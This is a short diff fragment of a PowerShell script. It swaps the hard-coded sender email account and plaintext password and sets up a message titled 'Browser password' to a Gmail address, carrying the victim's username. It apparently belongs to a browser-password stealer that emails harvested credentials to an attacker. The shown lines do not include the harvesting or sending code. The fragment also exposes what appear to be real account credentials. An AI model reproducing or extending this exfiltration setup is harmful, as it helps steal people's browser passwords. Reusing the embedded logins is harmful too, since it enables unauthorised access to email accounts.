@@ -1,7 +1,7 @@
 $username=$env:Username
 
-$From = "sabinprashant013@outlook.com"
-$Pass = "appreciation123"
+$From = "novicehckr@outlook.com"
+$Pass = "IMMrr1aN"
 $To = "9844417@gmail.com"
 $Subject = "Browser password"
 $Body = $username
